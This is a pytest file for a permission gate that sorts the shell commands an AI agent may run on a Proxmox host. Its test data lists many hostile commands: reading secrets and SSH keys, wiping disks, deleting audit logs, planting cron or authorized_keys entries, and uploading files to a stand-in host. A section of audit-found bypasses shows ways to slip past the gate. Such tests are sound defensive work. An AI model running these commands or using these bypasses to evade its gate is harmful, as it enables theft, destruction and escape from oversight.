"""The page's gate: which commands the agent may run, by tier and mode."""

import pytest

from nullbill.web import gate

PROTECTED = {"2002", "nullbill"}


def tier(command: str) -> str:
    return gate.classify(command, PROTECTED).tier


@pytest.mark.parametrize(
    "command",
    [
        "pct list",
        "qm config 105",
        "journalctl -u pveproxy --since '1 hour ago' --no-pager | tail -50",
        "systemctl status nullbill-web",
        "systemctl --failed",
        "cat /etc/hosts && df -h; free -m",
        "ls -la /var/log 2>/dev/null",
        "grep -r error /var/log/syslog 2>&1 | head",
        "ip -4 addr show",
        "pvesm status",
        "pvesh get /nodes/pve/qemu --output-format json",
        "smartctl -a /dev/sda",
        "nvidia-smi",
        "curl -sSf http://10.42.1.20:9090/-/ready",
        "pct exec 105 -- systemctl status forgejo",
        "qm guest exec 110 -- cat /etc/os-release",
        "find /etc -name '*.conf' -mtime -1",
        "dpkg -l | grep pve",
        "apt list --upgradable",
        "timeout 10 ping -c 3 192.0.2.1",
        "sh -c 'uptime; lsblk'",
        "pct list 2002",
        "fdisk -l",
        "wget -qO- http://192.0.2.5/",
        "openssl x509 -in /etc/pve/local/pve-ssl.pem -noout -dates",
        "env",
        "mount",
        "sed -n p /etc/hosts",
        "sed -n '1,20p' /etc/fstab",
        "sed 's/a/b/g' /etc/hosts",
        "awk '{print $1}' /proc/loadavg",
        "awk -F: '$3 >= 1000 {print $1}' /etc/passwd",
        "LANG=C df -h",
        "for f in a b; do echo f; done",
        "if test -f /etc/hosts; then cat /etc/hosts; fi",
        "ls /etc/*",
        "ls /root/.ssh",
        "cat /etc/ssh/sshd_config",
        "parted /dev/sda print",
        "nvme list",
        "nvme smart-log /dev/nvme0",
        "qm guest cmd 110 get-osinfo",
        "qm agent 110 ping",
        "bash -o pipefail -c 'journalctl -u ssh | tail'",
        "sudo -u nobody ls /tmp",
        "timeout -s KILL 10 uptime",
        "command -v pct",
        "grep -r error /var/log",
        "auditctl -l",
        "pveum user list",
        "proxmox-backup-client snapshot list --repository root@pam@192.0.2.9:store",
        "mount -t ext4",
        "ip netns exec blue ip addr",
        "nb-power status",
        "/usr/local/sbin/nb-power status --json",
    ],
)
def test_read(command):
    assert tier(command) == gate.READ, gate.classify(command, PROTECTED)


@pytest.mark.parametrize(
    "command",
    [
        "systemctl restart pveproxy",
        "nb-power start media",
        "nb-power stop inference --by agent",
        "nb-power keep media on",
        "nb-power tick",
        "apt-get install -y htop",
        "pct exec 105 -- systemctl restart forgejo",
        "echo hi > /tmp/x",
        "curl -X POST http://192.0.2.5/api",
        "curl -o /tmp/f http://192.0.2.5/",
        "pct stop 105",
        "rm /tmp/stale.lock",
        "echo $(touch /tmp/x)",
        "echo $HOME",
        "echo $(id)",
        "for f in a b; do echo $f; done",
        "FOO=1 ls",
        "sort -o /etc/x /etc/y",
        "find / -name x -exec chmod 600 {} ;",
        "env rm /tmp/x",
        "mount /dev/sdb1 /mnt",
        "sleep 5 &",
        "sed -n 'w /tmp/x' /etc/hosts",
        "sed 's/a/b/e' /etc/hosts",
        "less /var/log/syslog",
        "ldd /usr/bin/ls",
        "tailscale debug prefs",
        "qm agent 110 shutdown",
        "pct mtunnel 105",
        "ss -K dst 192.0.2.1",
        "arp -d 192.0.2.1",
        "hostnamectl hostname newname",
        "mount -a",
        "swapon -a",
        "ethtool -t eth0",
        "iptables-save -f /tmp/rules",
        "nvidia-smi -f /tmp/out",
        "wget -O /tmp/x http://192.0.2.5/",
        "wget -qO- -o /tmp/log http://192.0.2.5/",
        "curl -D /tmp/h http://192.0.2.5/",
        "curl --cookie-jar /tmp/c http://192.0.2.5/",
        "time -o /tmp/t ls",
        "nohup uptime",
        "cp /etc/hosts /tmp/hosts",
        "x=1",
        "systemctl restart nb-log-shipper",
    ],
)
def test_change(command):
    assert tier(command) == gate.CHANGE, gate.classify(command, PROTECTED)


@pytest.mark.parametrize(
    ("command", "word"),
    [
        ("pct destroy 105", "105"),
        ("qm rollback 110 before-upgrade", "110"),
        ("reboot", "reboot"),
        ("systemctl reboot", "reboot"),
        ("rm -rf /var/lib/vz/images/999", "delete"),
        ("apt-get purge -y foo", "remove"),
        ("pve-firewall stop", "stop"),
        ("systemctl stop ssh", "stop"),
        ("find /tmp -name '*.old' -delete", "delete"),
        ("timeout 5 pct destroy 105", "105"),
        ("xargs pct destroy", "destroy"),
        ("python3 -c 'print(1)'", "run"),
        ("echo ls | bash", "run"),
        ("bash /tmp/fix.sh", "run"),
        ("eval ls", "run"),
        ("source /tmp/env", "run"),
        (". /tmp/env", "run"),
        ("perl -e 'print 1'", "run"),
        ("awk -f /tmp/prog.awk /etc/hosts", "run"),
        ("awk 'BEGIN{system(\"id\")}'", "run"),
        ("awk '{print > \"/tmp/x\"}' /etc/hosts", "run"),
        ("env -S 'ls -l'", "run"),
        ("sudo -s", "run"),
        ("LD_PRELOAD=/tmp/x.so ls", "run"),
        ("PATH=/tmp ls", "run"),
        ("export PATH=/tmp", "run"),
        ("$'\\x6cs' /tmp", "run"),
        ("{ls,-la}", "run"),
        ("curl file:///etc/hostname", "run"),
        ("ip -batch /tmp/cmds", "run"),
        ("ssh 192.0.2.3 uptime", "connect"),
        ("truncate -s 0 /var/log/syslog", "truncate"),
        ("sort --compress-program=gzip /tmp/x", "run"),
        ("openssl x509 -engine foo -in /tmp/c", "run"),
    ],
)
def test_risky(command, word):
    verdict = gate.classify(command, PROTECTED)
    assert verdict.tier == gate.RISKY, verdict
    assert verdict.word


@pytest.mark.parametrize(
    "command",
    [
        "cat /var/lib/nullbill/secrets.sops.yaml",
        "cat /var/lib/nullbill/setup-code",
        "cat /var/lib/nullbill/release-upgrade.result/../setup-code",
        "grep -r x /var/lib/nullbill",
        "rm -rf /tmp/../etc",
        "rm -rf /var/tmp/x /etc",
        "pct exec 2002 -- cat /tmp/x",
        "pct stop 2002",
        "pct destroy 2002",
        "cat /etc/pve/priv/token.cfg",
        "wipefs -a /dev/sdb",
        "mkfs.ext4 /dev/sdb1",
        "dd if=/dev/zero of=/dev/sdb bs=1M",
        "journalctl --vacuum-time=1s",
        "systemctl stop nb-log-shipper",
        "systemctl mask systemd-journald",
        "echo key >> /root/.ssh/authorized_keys",
        "rm -rf /",
        "rm -rf /etc",
        "proxmox-backup-client forget host/105/2026-11-01T00:00:00Z",
        "pvesm prune-backups nb-pbs --keep-last 1",
        "zpool destroy tank",
        "auditctl -D",
        "sgdisk --zap-all /dev/sdb",
        "pct enter 105",
        "sh -c 'cat /etc/nullbill/tls/forgejo.key'",
        "grep -r . /root/.ssh/id_ed25519",
        "cat /etc/shadow",
        "",
        # secrets, however spelled
        "cat /etc/pve//priv/token.cfg",
        "cat /etc/pve/./priv/token.cfg",
        "cat /etc/pve/../pve/priv/token.cfg",
        'cat "/etc/pve/pr""iv/token.cfg"',
        "cat ~/.ssh/id_ed25519",
        "cat /e*/shad*",
        "cat /etc/pve/pri*/*",
        "head /root/.ss?/id_*",
        "cat /proc/1/environ",
        "cat /var/lib/tailscale/tailscaled.state",
        "cat /etc/forgejo/app.ini",
        "cat /etc/litellm/config.yaml",
        "cat /etc/proxmox-backup/shadow.json",
        "getent shadow",
        "echo $(cat /etc/shadow)",
        "ls `cat /etc/pve/priv/token.cfg`",
        "grep -r token /etc",
        "grep -R pass /",
        "rgrep x /root",
        "find / -name '*.cfg' -exec cat {} +",
        # raw disks
        "cat /dev/sda",
        "head -c 512 /dev/nvme0n1",
        "dd if=/dev/sda of=/tmp/mbr bs=512 count=1",
        "echo x > /dev/sdb",
        "cat < /dev/sda",
        "nvme format /dev/nvme0n1",
        "nvme sanitize /dev/nvme0",
        "parted /dev/sdb mklabel gpt",
        "parted /dev/sdb rm 1",
        "zpool create tank /dev/sdb",
        "hdparm --security-erase x /dev/sdb",
        "cryptsetup luksFormat /dev/sdb",
        "sh -c 'echo wipefs -a /dev/sdb | sh'",
        "timeout 5 wipefs -a /dev/sdb",
        "sudo -u root mkfs.ext4 /dev/sdb1",
        "cp /tmp/img /dev/sdb",
        # the record of what ran
        "systemctl stop systemd-journald.socket",
        "systemctl edit auditd",
        "systemctl kill rsyslog",
        "pkill journald",
        "kill $(pidof auditd)",
        "kill -9 1",
        "apt-get purge -y auditd",
        "auditctl -e 0",
        "echo Storage=none >> /etc/systemd/journald.conf",
        "rm /var/log/journal/x/system.journal",
        "truncate -s 0 /var/log/audit/audit.log",
        "sed -i s/a/b/ /etc/audit/auditd.conf",
        "cp /tmp/x /usr/local/bin/nb-agent-command",
        "echo x >| /root/.ssh/authorized_keys",
        "tee -a /etc/sudoers",
        # who may sign in
        "pveum user token add root@pam t",
        "pveum acl modify / -user x@pve -role Administrator",
        "passwd root",
        "useradd x",
        "pvesh create /access/users --userid x@pve",
        "qm guest passwd 110 root",
        # backups
        "pvesh delete /nodes/pve/storage/nb-pbs/content/backup/vm-105",
        "vzdump 105 --prune-backups keep-last=0",
        "lvremove -y nb-pbs-disk/datastore",
        "proxmox-backup-client prune host/105 --keep-last 0",
        # the NullBill container
        "pvesh set /nodes/pve/lxc/2002/config --memory 1",
        "lxc-stop -n 2002",
        "lxc-attach -n 2002 -- ls",
        "echo x >> /etc/pve/lxc/2002.conf",
        "pct clone 105 2002",
        "qm guest exec 2002 -- ls",
    ],
)
def test_blocked(command):
    assert tier(command) == gate.BLOCKED, gate.classify(command, PROTECTED)


def test_public_keys_are_not_secrets():
    assert tier("cat /etc/ssh/ssh_host_ed25519_key.pub") == gate.READ


def test_modes():
    assert gate.runs_unasked("manual", gate.READ)
    assert not gate.runs_unasked("manual", gate.CHANGE)
    assert gate.runs_unasked("auto", gate.CHANGE) and not gate.runs_unasked("auto", gate.RISKY)
    assert gate.runs_unasked("yolo", gate.RISKY)
    assert not any(gate.runs_unasked(mode, gate.BLOCKED) for mode in gate.MODES)
    assert not gate.runs_unasked("nonsense", gate.CHANGE)


def test_choices_summary():
    lines = gate.summarize_choices(
        {"workloads": ["agents", "media"], "backups": False}, {"workloads": ["agents", "linux-ci"], "backups": True}
    )
    assert lines == ["Add linux-ci", "Remove media (setup stops before deleting their guests and asks you)", "Nightly backups: on"]


def test_ip_brief_is_not_batch():
    assert tier("ip -br a") == gate.READ
    assert tier("ip -b /tmp/cmds") == gate.RISKY


def test_a_guests_state_files_are_no_secret():
    # The page agent could not read why an upgrade stopped (2026-11-14).
    for command in ["cat /var/lib/nullbill/release-upgrade.result", "cat /var/lib/nullbill/power.json"]:
        assert gate.classify(command, PROTECTED).tier == gate.READ, command


def test_a_scratch_folder_in_tmp_is_no_system_directory():
    # rm -rf /tmp/nbtest was refused in every mode as "a whole system directory".
    for command in ["rm -rf /tmp/nbtest", "rm -r /var/tmp/nb-cmake-test"]:
        assert gate.classify(command, PROTECTED).tier == gate.CHANGE, command
    for command in ["rm -rf /tmp", "rm -rf /tmp/*", "rm -rf /opt/x"]:
        assert gate.classify(command, PROTECTED).tier == gate.BLOCKED, command
    # Expansions, `..` and a link's contents are no scratch folder.
    for command in [
        "rm -rf /tmp/{x,../etc}",
        "x=../etc; rm -rf /tmp/$x",
        "rm -rf /tmp/$(echo ../etc)",
        "ln -s /etc /tmp/e && rm -rf /tmp/e/",
        "rm -rf /tmp/e/ssh",
        "rm -rf /tmp/..",
    ]:
        assert gate.classify(command, PROTECTED).tier in (gate.RISKY, gate.BLOCKED), command


# Commands an audit found the gate sorted too low (2026-11-18): each must
# now come out at least at the tier beside it.
C, R, B = gate.CHANGE, gate.RISKY, gate.BLOCKED
BYPASSES = [
    # GNU long options by a prefix: --out is --output, --compress-prog runs a program.
    ("printf '%s\\n' '* * * * * root touch /tmp/pwned' | sort --out=/etc/cron.d/nb", C),
    ("sort --o=/etc/cron.d/x /tmp/y", C),
    ("sort --out=/etc/sudoers.d/x /tmp/y", B),
    ("sort -o /root/.ssh/authorized_keys /tmp/k", B),
    ("seq 3000 | sed 's/.*/touch \\/tmp\\/pwned/' | sort -S 1K --compress-prog=sh", R),
    ("sort -S 1K --compress-progr=sh /tmp/x", R),
    ("sort --compress-p=sh /tmp/x", R),
    ("journalctl --vac=1s", B),
    ("journalctl --vacuum-t=1s", B),
    ("journalctl --rot", B),
    ("journalctl --flu", B),
    ("journalctl --setup-k", B),
    ("wget --output-doc=/etc/cron.d/x https://192.0.2.5/", C),
    ("wget -O- --post-f=/etc/hosts https://192.0.2.5/", C),
    ("wget -O- --rec https://192.0.2.5/", C),
    ("curl https://192.0.2.5/ --outpu /etc/x", C),
    ("curl https://192.0.2.5/ --data-bin @/etc/hosts", C),
    ("curl https://192.0.2.5/ --upl /etc/hosts", C),
    ("curl -sX POST https://192.0.2.5/", C),
    ("curl --unix-socket /run/x https://h/x", C),
    ("ethtool --cha eth0 speed 10", C),
    ("git log --outp=/etc/cron.d/x", C),
    ("git diff --ext-dif", C),
    ("git log --exec-p=/tmp", C),
    # The output operand: `-` is standard input, not a flag.
    ("printf '* * * * * root id\\n' | uniq - /etc/cron.d/nb2", C),
    ("uniq /tmp/a /root/.ssh/authorized_keys", B),
    ("echo 2a | xxd -r -p - /etc/cron.d/nb", C),
    ("xxd -r /tmp/x /etc/cron.d/x", C),
    ("echo 2a | xxd -r -p - /root/.ssh/authorized_keys", B),
    ("echo 2a | xxd -r -p - /usr/local/bin/nb-agent-command", B),
    ("echo 2a | xxd -r -p - /etc/pve/lxc/2002.conf", B),
    ("echo 2a | xxd -r -p - /dev/sda", B),
    # openssl writes what -writerand and -out name.
    ("openssl x509 -in /etc/hosts -noout -writerand /tmp/x", C),
    ("openssl x509 -in /etc/hosts -noout -writerand /root/.ssh/authorized_keys", B),
    ("openssl rand -writerand /var/log/journal/x/system.journal 1", B),
    ("openssl req -config /tmp/x", R),
    # Code run by a program that otherwise only changes things.
    ("tar -xf /tmp/x.tar --to-command=sh", R),
    ("tar -I 'sh -c reboot' -xf /tmp/x", R),
    ("tar --use-compress-program=/tmp/x -cf /tmp/y /tmp/z", R),
    ("tar cf /dev/null /tmp --checkpoint=1 --checkpoint-action=exec=reboot", R),
    ("git -c core.pager=sh log", R),
    ("git -c core.sshCommand=/tmp/x fetch", R),
    ("git -c core.editor=/tmp/x commit", R),
    ("git -c diff.external=/tmp/x diff", R),
    ("git -c alias.st=!reboot st", R),
    ("git --config-env=core.pager=X log", R),
    ("dpkg -i /tmp/x.deb", R),
    ("apt-get install ./evil.deb", R),
    ("man -P 'sh -c reboot' ls", R),
    ("rsync -e 'sh -c reboot' /tmp/a x:/tmp/b", R),
    ("make -C /tmp/x", R),
    ("pip install /tmp/x", R),
    # iproute2 takes prefixes of objects and commands.
    ("ip l s vmbr0 down", R),
    ("ip link set dev vmbr0 down", R),
    ("ip -n x l s vmbr0 down", R),
    ("ip a f dev vmbr0", R),
    ("ip addr flush dev vmbr0", R),
    ("ip ro fl all", R),
    ("ip r d default", R),
    ("ip l d vmbr0", R),
    ("ip link delete vmbr0", R),
    ("ip neigh fl all", R),
    ("ip x s fl", R),
    ("ip xfrm state flush", R),
    ("ip tuntap del x", R),
    ("ip link set eth0 up", C),
    ("ip netns e x reboot", R),
    ("ip netns exe x reboot", R),
    ("ip netn e x reboot", R),
    ("ip -all netns e reboot", R),
    ("ip -a netns e reboot", R),
    ("ip vrf e x reboot", R),
    ("ip netns e x cat /etc/shadow", B),
    # git branch and remote read only in their list forms.
    ("git branch -D main", C),
    ("git branch newbranch", C),
    ("git remote set-url origin https://192.0.2.9/x", C),
    ("git remote add x y", C),
    # Brace expansion spells what the text does not.
    ("base64 -w0 /etc/pve/pr{i,}v/authk{e,}y.k{e,}y", B),
    ("base64 -w0 /var/lib/lxc/2002/rootfs/var/lib/nullbil{l,}/age.k{e,}y", B),
    ("cat /etc/{shadow,hosts}", B),
    ("cat /etc/pve/pr{i,}v/storage/nb-pbs.pw", B),
    ("date -f /etc/pve/pr{i,}v/token.cfg", B),
    ("tail -n+1 /etc/pve/pr{i,}v/*", B),
    ("grep -r . /e{t,}c", B),
    ("grep -r . /{etc,x}", B),
    ("cat /dev/s{d,}a", B),
    ("pct exec {2002,} -- cat /etc/hostname", B),
    ("pct exec 20{0,}02 -- ls", B),
    ("pct destroy {2002,}", B),
    ("qm guest exec {2002,} -- ls", B),
    ("lxc-attach -n{2002,} -- reboot", B),
    ("echo x > /etc/pve/lxc/20{0,}02.conf", B),
    ("journalctl --{vacuum-time=1s,}", B),
    ("journalctl --vac{u,}um-time=1s", B),
    ("systemctl stop {systemd-journald,}", B),
    ("systemctl stop systemd-journ{a,}ld", B),
    ("kill -9 $(pidof systemd-journ{a,}ld)", B),
    ("rm -rf /var/log/jour{n,}al", B),
    ("echo k >> /root/.ssh/authorized_k{e,}ys", B),
    ("tee -a /etc/sudoe{r,}s.d/x", B),
    ("wipef{s,} -a /dev/sdb", B),
    ("/usr/sbin/wipef{s,} -a /dev/sdb", B),
    ("mkf{s,}.ext4 /dev/sdb", B),
    ("dd if=/dev/zero of=/dev/s{d,}b", B),
    ("proxmox-backup-client snapshot forg{e,}t x", B),
    ("usermo{d,} -aG sudo x", B),
    ("passw{d,} root", B),
    ("pveu{m,} acl modify / -user x -role Administrator", B),
    ("pvesh set /acc{e,}ss/acl --path / --roles Administrator --users x@pve", B),
    ("echo {1..1000000}", B),
    ("ls /tmp/{a,b}", R),
    ("cp /tmp/x{,.bak}", R),
    # Relative names after cd, pushd, -C and --directory.
    ("cd /root/.ssh && base64 id_ed25519", B),
    ("cd /root/.ssh; cat id*", B),
    ("cd /etc; cat sh*", B),
    ("pushd /etc/pve && cat priv/token.cfg", B),
    ("cd /etc && cd pve && cat priv/token.cfg", B),
    ("cd /var/lib/lxc/2002/rootfs/root/.ssh; base64 id_ed25519", B),
    ("cd /var/lib/lxc/2002/rootfs/var/lib/nullbil{l,}; base64 secrets.so{p,}s.yaml", B),
    ("cd /var/lib/lxc/2002/rootfs/var/lib; ls nullbil{l,}", B),
    ("cd /etc && grep -r token pve", B),
    ("tar c -C /etc pve | base64", B),
    ("tar c -C /root .ssh | base64", B),
    ("tar -c --directory=/root .ssh", B),
    ("tar -c --dir /etc pve", B),
    ("tar cz /etc/pve | base64", B),
    ("tar czf - /etc | base64", B),
    ("tar cf - /root | base64", B),
    ("zip -r - /etc | base64", B),
    ("cd - && cat x", C),
    # The NullBill container by its other names.
    ("lxc-attach -n2002 -- ls", B),
    ("lxc-attach --name=2002 -- ls", B),
    ("lxc-stop -n2002", B),
    ("ls /var/lib/lxc/2002/rootfs", B),
    ("cat /var/lib/lxc/2002/rootfs/etc/hostname", B),
    ("grep -r . /var/lib/lxc/2002/rootfs/var/lib", B),
    ("cat /proc/123/root/etc/hostname", B),
    ("echo x > /proc/123/root/etc/cron.d/x", B),
    ("ls /proc/1/cwd/", B),
    ("chroot /proc/1/root cat /x", B),
    ("nsenter -t 12345 -a cat /etc/hosts", B),
    ("pct exec 02002 -- ls", B),
    ("pct stop -- 2002", B),
    ("pvesh create /nodes/pve/lxc//2002/status/stop", B),
    ("pvesh create access/users/root@pam/token/x --privsep 0", B),
    ("pvesh create /nodes/../access/users/root@pam/token/x", B),
    ("cat /var/lib/vz/dump/vzdump-lxc-2002-2026_11_18-00_00_00.tar.zst", B),
    ("cat /dev/pve/vm-2002-disk-0", B),
    ("pct set 105 --mp0 /etc/pve,mp=/x", B),
    ("pct set 105 -mp0 /,mp=/host", B),
    ("pct set 105 --hookscript local:snippets/x.sh", R),
    ("qm set 110 --args '-x'", R),
    ("pvesh get /nodes/pve/qemu/110/agent/file-read --file /x", R),
    # Secrets a process's environment holds.
    ("ps auxeww", B),
    ("ps e -p 1", B),
    ("ps -eo pid,environ", B),
    ("cat /proc/1/task/1/environ", B),
    ("strings /proc/12/task/12/environ", B),
    ("cat /proc/12/root/proc/self/environ", B),
    # The record of what ran, by other names.
    ("systemctl mask journald.service", B),
    ("systemctl stop 'systemd-journ*'", B),
    ("systemctl stop *journald", B),
    ("systemctl --no-block stop systemd-journald", B),
    ("pkill -f jo.rnald", B),
    ("ln -sf /dev/null /etc/systemd/system/systemd-journald.service", B),
    ("rm /lib/systemd/system/auditd.service", B),
    ("apt-get install -y auditd-", B),
    ("echo b > /proc/sysrq-trigger", R),
    ("dd of=/proc/sysrq-trigger", R),
    # Secrets in the guests NullBill sets up.
    ("cat /etc/forgejo/secrets/jwt_secret", B),
    ("cat /etc/forgejo/secrets/internal_token", B),
    ("cat /etc/factorio/rcon-password", B),
    ("cat /etc/forgejo/nullbill-token", B),
    ("cat /etc/llama/api-key", B),
    ("tdbdump /var/lib/samba/private/passdb.tdb", B),
    ("tdbdump passdb.tdb", B),
    ("cat /etc/wireguard/wg0.conf", B),
    ("pct exec 105 -- cat /etc/forgejo/secrets/secret_key", B),
    ("wg showconf wg0", B),
    ("wg show wg0 dump", B),
    ("wg show wg0 private-key", B),
    ("pdbedit -Lw", B),
    ("pdbedit -w -L", B),
    # Its restore test printed a file of a backup (another fix stops that).
    ("cat /var/lib/nullbill/restore-test.json", C),
]


@pytest.mark.parametrize(("command", "least"), BYPASSES)
def test_bypasses_found_by_the_audit(command, least):
    verdict = gate.classify(command, PROTECTED)
    assert gate.ORDER.index(verdict.tier) >= gate.ORDER.index(least), verdict


@pytest.mark.parametrize(
    "command",
    [
        "ip a s",
        "ip a s eth0",
        "ip -br -c a",
        "ip r",
        "ip route get 192.0.2.1",
        "ip -s link",
        "ip mon",
        "ip netns e x cat /etc/hosts",
        "git branch",
        "git branch -a --list 'nb-*'",
        "git branch --contains abc123",
        "git remote -v",
        "git remote show origin",
        "git -C /opt/nullbill log -3",
        "git log -c",
        "git -c color.ui=never status",
        "sort -u /etc/hosts",
        "sort -k2 -t: /etc/passwd",
        "uniq -c /tmp/x",
        "uniq -f 1 /tmp/a",
        "xxd /etc/hosts",
        "ps aux",
        "ps -ef",
        "ps -eo pid,comm,etime",
        "ps axo pid,etime",
        "wg show",
        "wg show wg0",
        "pdbedit -L",
        "cd /var/log && grep -i error syslog",
        "cd /etc && cat hosts",
        "cat /etc/pam.d/common-password",
        "openssl x509 -in /etc/pve/local/pve-ssl.pem -noout -dates",
        "journalctl -u ssh --since today --no-pager",
        "systemctl --failed",
        "systemctl status 'systemd-journal*'",
        "pvesh get /nodes/pve/lxc/2002/status/current",
        "pct config 02002",
        "grep -i password /var/log/syslog",
    ],
)
def test_reads_that_stay_reads(command):
    assert tier(command) == gate.READ, gate.classify(command, PROTECTED)


def test_brace_expansion_follows_bash():
    assert gate.braces("echo a{b,c}d") == "echo abd acd"
    assert gate.braces("echo {1..3} {a..c} {01..03}") == "echo 1 2 3 a b c 01 02 03"
    assert gate.braces("echo {a,{b,c}}") == "echo a b c"
    assert gate.braces("echo '{a,b}' \"{c,d}\" \\{e,f\\} ${x,,} {} {a}") is None
    assert gate.braces("find . -exec cat {} \\;") is None
    assert gate.braces('cat <<EOF\n{"a":1,"b":2}\nEOF') is None
